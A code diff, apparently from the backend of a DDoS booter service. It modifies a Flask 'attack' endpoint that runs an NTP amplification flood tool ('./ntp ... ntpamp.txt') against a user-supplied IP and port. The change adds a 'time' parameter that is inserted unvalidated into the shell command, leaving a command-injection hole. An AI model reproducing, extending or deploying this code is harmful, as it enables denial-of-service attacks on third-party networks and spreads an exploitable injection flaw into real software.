@@ -40,9 +40,10 @@ def validate_port(port):
 def attack():
     ip = request.args.get('ip')
     port = request.args.get('port')
+    timeout = request.args.get('time')
 
     # 验证参数
-    if not ip or not port:
+    if not ip or not port or not timeout:
         return jsonify({"error": "Missing 'ip' or 'port' parameter"}), 400
 
     if not validate_ip(ip):
@@ -56,7 +57,7 @@ def attack():
 
     # 构建要执行的命令
     # 使用 timeout 确保命令在 60 秒后终止
-    command = f"timeout 60s ./ntp {ip} {port} ntpamp.txt 100 -1 60"
+    command = f"timeout 60s ./ntp {ip} {port} ntpamp.txt 100 -1 {timeout}"
 
     # 启动 screen 会话并在其中执行命令
     try:
